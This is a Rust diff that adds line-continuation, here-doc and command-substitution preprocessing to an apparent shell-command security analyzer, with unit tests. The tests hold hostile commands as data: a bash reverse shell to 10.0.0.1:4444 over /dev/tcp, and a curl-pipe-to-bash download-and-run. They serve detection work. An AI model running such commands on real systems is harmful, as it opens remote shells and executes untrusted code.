@@ -169,6 +169,157 @@ pub fn parse_line(line: &str) -> Vec<Command> {
     commands
 }
 
+/// A logical unit of input to analyze: a command line (after joining
+/// continuations) plus the physical line it started on. Here-doc bodies fed to
+/// a shell interpreter are emitted as their own units at their real line.
+#[derive(Debug, Clone)]
+pub struct Unit {
+    pub line: usize,
+    pub text: String,
+}
+
+/// Shell / scripting interpreters. A here-doc fed to one of these has its body
+/// analyzed (it is executable code, not data).
+const INTERPRETERS: &[&str] = &[
+    "bash", "sh", "dash", "zsh", "ksh", "python", "python3", "python2", "perl", "ruby", "php",
+    "node",
+];
+
+fn ends_with_odd_backslash(line: &str) -> bool {
+    line.chars().rev().take_while(|&c| c == '\\').count() % 2 == 1
+}
+
+/// The delimiter word of the first here-doc operator (`<<WORD`, `<<-WORD`,
+/// `<<'WORD'`) in `text`, if any. Here-strings (`<<<`) yield `None`.
+fn heredoc_delimiter(text: &str) -> Option<String> {
+    let idx = text.find("<<")?;
+    let after = &text[idx + 2..];
+    if after.starts_with('<') {
+        return None; // here-string <<<
+    }
+    let after = after.strip_prefix('-').unwrap_or(after);
+    let after = after.trim_start().trim_start_matches(['\'', '"']);
+    let delim: String = after
+        .chars()
+        .take_while(|c| c.is_ascii_alphanumeric() || *c == '_')
+        .collect();
+    (!delim.is_empty()).then_some(delim)
+}
+
+/// Does this command line invoke a shell / scripting interpreter (e.g. the
+/// consumer of a here-doc body)?
+fn feeds_interpreter(text: &str) -> bool {
+    parse_line(text)
+        .iter()
+        .any(|c| INTERPRETERS.contains(&c.program.as_str()))
+}
+
+/// Extract the inner text of every `$(...)` and backtick command substitution,
+/// recursing into nested `$(...)`.
+pub fn command_substitutions(text: &str) -> Vec<String> {
+    let mut out = Vec::new();
+    let bytes = text.as_bytes();
+    let mut i = 0;
+    while i < bytes.len() {
+        if bytes[i] == b'$' && i + 1 < bytes.len() && bytes[i + 1] == b'(' {
+            let start = i + 2;
+            let mut depth = 1;
+            let mut j = start;
+            while j < bytes.len() {
+                match bytes[j] {
+                    b'(' => depth += 1,
+                    b')' => {
+                        depth -= 1;
+                        if depth == 0 {
+                            break;
+                        }
+                    }
+                    _ => {}
+                }
+                j += 1;
+            }
+            if depth == 0 {
+                let inner = &text[start..j];
+                out.push(inner.to_string());
+                out.extend(command_substitutions(inner));
+                i = j + 1;
+                continue;
+            }
+        }
+        if bytes[i] == b'`'
+            && let Some(rel) = text[i + 1..].find('`')
+        {
+            let inner = &text[i + 1..i + 1 + rel];
+            out.push(inner.to_string());
+            i = i + 1 + rel + 1;
+            continue;
+        }
+        i += 1;
+    }
+    out
+}
+
+/// Split raw input into logical units, honoring line continuations (trailing
+/// `\`, `|`, `&&`, `||`) and here-docs. A here-doc body is treated as data and
+/// skipped, unless the command consuming it is a shell/interpreter, in which
+/// case each body line becomes its own unit at its physical line number.
+pub fn preprocess(input: &str) -> Vec<Unit> {
+    let phys: Vec<&str> = input.lines().collect();
+    let mut units = Vec::new();
+    let mut i = 0;
+    while i < phys.len() {
+        let start_line = i + 1;
+        // Join continuation lines.
+        let mut parts: Vec<String> = Vec::new();
+        let mut j = i;
+        loop {
+            let raw = phys[j];
+            if ends_with_odd_backslash(raw) && j + 1 < phys.len() {
+                let pos = raw.rfind('\\').unwrap();
+                parts.push(raw[..pos].to_string());
+                j += 1;
+                continue;
+            }
+            parts.push(raw.to_string());
+            let te = raw.trim_end();
+            let op_cont = te.ends_with("&&")
+                || te.ends_with("||")
+                || (te.ends_with('|') && !te.ends_with("||"));
+            if op_cont && j + 1 < phys.len() {
+                j += 1;
+                continue;
+            }
+            break;
+        }
+        let text = parts.join(" ");
+
+        // Emit the command line itself.
+        units.push(Unit {
+            line: start_line,
+            text: text.clone(),
+        });
+
+        // Here-doc body follows the last physical line of the logical command.
+        let mut next = j + 1;
+        if let Some(delim) = heredoc_delimiter(&text) {
+            let fed = feeds_interpreter(&text);
+            let mut k = j + 1;
+            while k < phys.len() && phys[k].trim() != delim {
+                if fed {
+                    units.push(Unit {
+                        line: k + 1,
+                        text: phys[k].to_string(),
+                    });
+                }
+                k += 1;
+            }
+            next = if k < phys.len() { k + 1 } else { k };
+        }
+        i = next;
+    }
+    units
+}
+
 #[cfg(test)]
 mod tests {
     use super::*;
@@ -212,5 +363,41 @@ mod tests {
     fn raw_is_preserved_for_redirect() {
         let cmds = parse_line("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1");
         assert!(cmds[0].raw.contains("/dev/tcp"));
+    }
+
+    #[test]
+    fn backslash_continuation_joins_lines() {
+        let units = preprocess("curl \\\n  http://x/y");
+        assert_eq!(units.len(), 1);
+        assert!(units[0].text.contains("curl"));
+        assert!(units[0].text.contains("http://x/y"));
+    }
+
+    #[test]
+    fn trailing_pipe_continues_to_next_line() {
+        let units = preprocess("curl http://x/y |\n bash");
+        assert_eq!(units.len(), 1);
+        assert!(units[0].text.contains("| bash") || units[0].text.contains("|  bash"));
+    }
+
+    #[test]
+    fn heredoc_data_body_is_skipped_but_shell_body_is_kept() {
+        // cat's here-doc is data -> only the `cat` line is a unit.
+        let data = preprocess("cat <<EOF\nsecret-token=abc\nEOF\nwhoami");
+        let texts: Vec<_> = data.iter().map(|u| u.text.trim()).collect();
+        assert!(texts.contains(&"cat <<EOF"));
+        assert!(!texts.iter().any(|t| t.contains("secret-token")));
+        assert!(texts.contains(&"whoami"));
+
+        // bash's here-doc is executable -> body lines become units.
+        let shell = preprocess("bash <<EOF\nwhoami\nEOF");
+        assert!(shell.iter().any(|u| u.text.trim() == "whoami"));
+    }
+
+    #[test]
+    fn extracts_command_substitutions() {
+        let subs = command_substitutions("x=$(whoami); y=`id`");
+        assert!(subs.iter().any(|s| s.contains("whoami")));
+        assert!(subs.iter().any(|s| s.contains("id")));
     }
 }
